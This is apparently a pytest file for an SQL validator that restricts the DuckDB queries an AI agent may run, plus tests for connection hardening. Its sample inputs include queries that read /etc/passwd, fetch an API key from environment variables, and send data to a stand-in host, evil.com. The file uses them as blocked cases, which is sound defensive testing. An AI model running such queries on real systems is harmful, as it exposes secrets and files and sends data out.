"""Tests for seeknal.ask.security — agent SQL validation."""

import pytest
from seeknal.ask.security import validate_sql_for_agent, AGENT_BLOCKED_FUNCTIONS


class TestValidateSqlForAgent:
    """Tests for the agent-specific SQL validation layer."""

    def test_allows_simple_select(self):
        validate_sql_for_agent("SELECT * FROM customers")

    def test_allows_select_with_where(self):
        validate_sql_for_agent("SELECT name FROM orders WHERE amount > 100")

    def test_allows_with_cte(self):
        validate_sql_for_agent(
            "WITH cte AS (SELECT * FROM orders) SELECT * FROM cte"
        )

    def test_allows_describe(self):
        validate_sql_for_agent("DESCRIBE customers")

    def test_allows_show_tables(self):
        validate_sql_for_agent("SHOW TABLES")

    def test_blocks_drop(self):
        with pytest.raises(ValueError, match="DROP"):
            validate_sql_for_agent("DROP TABLE customers")

    def test_blocks_insert(self):
        with pytest.raises(ValueError, match="INSERT"):
            validate_sql_for_agent("INSERT INTO customers VALUES (1, 'test')")

    def test_blocks_read_text(self):
        with pytest.raises(ValueError, match="read_text"):
            validate_sql_for_agent("SELECT * FROM read_text('/etc/passwd')")

    def test_blocks_read_csv_auto(self):
        with pytest.raises(ValueError, match="read_csv_auto"):
            validate_sql_for_agent("SELECT * FROM read_csv_auto('/data/secret.csv')")

    def test_blocks_read_parquet(self):
        with pytest.raises(ValueError, match="read_parquet"):
            validate_sql_for_agent("SELECT * FROM read_parquet('/sensitive/data.parquet')")

    def test_blocks_http_get(self):
        with pytest.raises(ValueError, match="http_get"):
            validate_sql_for_agent("SELECT * FROM http_get('http://evil.com')")

    def test_blocks_http_post(self):
        with pytest.raises(ValueError, match="http_post"):
            validate_sql_for_agent("SELECT * FROM http_post('http://evil.com', body := 'data')")

    def test_blocks_glob(self):
        with pytest.raises(ValueError, match="glob"):
            validate_sql_for_agent("SELECT * FROM glob('/etc/*')")

    def test_blocks_read_json(self):
        with pytest.raises(ValueError, match="read_json"):
            validate_sql_for_agent("SELECT * FROM read_json('/etc/config.json')")

    def test_blocks_install(self):
        with pytest.raises(ValueError):
            validate_sql_for_agent("INSTALL httpfs")

    def test_blocks_load(self):
        with pytest.raises(ValueError):
            validate_sql_for_agent("LOAD httpfs")

    def test_blocks_attach(self):
        with pytest.raises(ValueError):
            validate_sql_for_agent("ATTACH '/tmp/evil.db'")

    def test_blocks_set(self):
        with pytest.raises(ValueError):
            validate_sql_for_agent("SET enable_external_access = true")

    def test_blocks_pragma(self):
        # PRAGMA is in the REPL allowlist but blocked by agent layer
        # It passes REPL check (allowed prefix) but is caught by our keyword block
        with pytest.raises(ValueError):
            validate_sql_for_agent("PRAGMA enable_progress_bar")

    def test_case_insensitive_function_block(self):
        with pytest.raises(ValueError, match="read_text"):
            validate_sql_for_agent("SELECT * FROM Read_Text('/etc/passwd')")

    def test_function_with_spaces_before_paren(self):
        with pytest.raises(ValueError, match="read_text"):
            validate_sql_for_agent("SELECT * FROM read_text ('/etc/passwd')")

    def test_blocks_getenv(self):
        with pytest.raises(ValueError, match="getenv"):
            validate_sql_for_agent("SELECT getenv('GOOGLE_API_KEY')")

    def test_blocks_current_setting(self):
        with pytest.raises(ValueError, match="current_setting"):
            validate_sql_for_agent("SELECT current_setting('enable_external_access')")

    def test_blocks_parquet_scan(self):
        with pytest.raises(ValueError, match="parquet_scan"):
            validate_sql_for_agent("SELECT * FROM parquet_scan('/data/secret.parquet')")

    def test_blocks_iceberg_scan(self):
        with pytest.raises(ValueError, match="iceberg_scan"):
            validate_sql_for_agent("SELECT * FROM iceberg_scan('/data/table')")

    def test_all_blocked_functions_covered(self):
        """Every function in the blocklist should be caught."""
        for func in AGENT_BLOCKED_FUNCTIONS:
            with pytest.raises(ValueError):
                validate_sql_for_agent(f"SELECT * FROM {func}('/test')")


class TestConfigureSafeConnection:
    """Tests for DuckDB connection hardening."""

    def test_disables_external_access(self):
        import duckdb

        conn = duckdb.connect(":memory:")
        from seeknal.ask.security import configure_safe_connection

        configure_safe_connection(conn)

        # After disabling, read_text should fail
        with pytest.raises(Exception):
            conn.execute("SELECT * FROM read_text('/etc/passwd')")

        conn.close()

    def test_sets_resource_limits(self):
        import duckdb

        conn = duckdb.connect(":memory:")
        from seeknal.ask.security import configure_safe_connection

        configure_safe_connection(conn)

        # Verify resource limits are set (512MB = 488.2 MiB)
        result = conn.execute("SELECT current_setting('max_memory')").fetchone()
        assert "488" in str(result[0]) or "512" in str(result[0])

        result = conn.execute("SELECT current_setting('threads')").fetchone()
        assert str(result[0]) == "2"

        conn.close()
